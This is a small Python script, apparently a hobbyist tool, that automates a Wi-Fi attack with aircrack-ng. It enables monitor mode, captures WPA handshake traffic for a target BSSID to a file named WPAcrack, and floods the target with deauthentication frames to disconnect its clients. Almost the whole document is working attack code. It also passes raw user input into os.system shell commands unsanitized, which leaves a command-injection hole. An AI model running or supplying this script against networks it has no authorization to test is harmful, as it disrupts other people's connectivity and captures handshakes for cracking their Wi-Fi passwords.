import os

print("Automated Aircrack-ng tool By Jeffrey")
print("-------------------------------------------")

interface = input("Type interface: ")
print("-------------------------------------------")
print("Interface set to: " + interface)
print("-------------------------------------------")
input("Press Enter to continue")

os.system('clear')

input("Press Enter to start monitor mode")
print("-------------------------------------------")

os.system('airmon-ng start ' + interface)

print("-------------------------------------------")
input("Press enter to continue")


os.system('airodump-ng mon0')

bssid = input("Enter Bssid: ")
print("-------------------------------------------")
channel = input("Enter Channel: ")
print("-------------------------------------------")
input("Press enter to continue")

os.system('clear')


os.system('airodump-ng --bssid ' + bssid + ' -c ' + channel + ' --write WPAcrack mon0')
print("-------------------------------------------")
input("Press enter to continue")

deauth = input("Enter the number of de-authenticate frames you want to send (example: 100): ")

os.system('aireplay-ng --deauth ' + deauth + ' -a ' + bssid + ' mon0')
